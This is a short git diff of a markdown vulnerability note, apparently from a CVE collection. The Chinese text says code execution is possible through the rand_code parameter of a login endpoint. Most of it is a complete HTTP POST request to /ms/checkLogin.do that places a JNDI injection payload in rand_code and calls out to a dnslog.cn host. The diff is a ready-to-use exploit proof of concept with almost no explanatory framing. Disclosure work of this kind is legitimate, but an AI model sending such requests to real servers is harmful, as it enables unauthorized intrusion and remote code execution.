@@ -2,7 +2,7 @@
 可以通过rand_code参数进行代码执行
 
 
-
+```
 POST /ms/checkLogin.do HTTP/1.1
 Host: 127.0.0.1:8088
 Content-Length: 106
@@ -27,5 +27,6 @@ User-Agent: 2
 X-Client-IP: 3
 
 managerName=msopen&managerPassword=123456&rememberMe=false&rand_code=${jndi:dns://xxxx.wputvy.dnslog.cn/t}
-
+```
+![图片](https://github.com/tanalala/CVE/assets/87268585/6e33165a-d46a-47a8-8a62-cc9a2b7cdcc6)
 
